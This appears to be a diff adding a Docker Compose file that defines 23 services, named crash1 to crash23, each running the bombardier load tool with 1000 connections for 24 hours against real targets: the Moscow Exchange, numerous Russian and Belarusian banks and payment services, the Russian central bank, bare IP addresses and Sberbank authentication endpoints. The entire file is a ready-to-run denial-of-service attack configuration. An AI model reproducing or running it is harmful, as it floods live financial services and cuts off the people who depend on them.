@@ -1,0 +1,71 @@
+version: "3.9"
+services:
+  crash1:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.moex.com"
+  crash2:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://178.248.236.218"
+  crash3:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://178.248.236.218:77"
+  crash4:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://194.247.132.130:77"
+  crash5:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://194.247.132.130:443"
+  crash6:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://yoomoney.ru"
+  crash7:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://qiwi.com"
+  crash8:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.tinkoff.ru"
+  crash9:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://mironline.ru"
+  crash10:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://belkart.by"
+  crash11:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.rsb.ru"
+  crash12:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.vtb.ru"
+  crash13:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://alfabank.ru"
+  crash14:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.sberbank.ru"
+  crash15:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.rncb.ru"
+  crash16:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.gazprombank.ru"
+  crash17:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.pochtabank.ru"
+  crash18:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://cbr.ru"
+  crash19:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.bspb.ru"
+  crash20:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.ubrr.ru"
+  crash21:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://raiffeisen.ru"
+  crash22:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://api.sberbank.ru/prod/tokens/v2/oauth"
+  crash23:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://api.sberbank.ru/prod/tokens/v2/oidc"
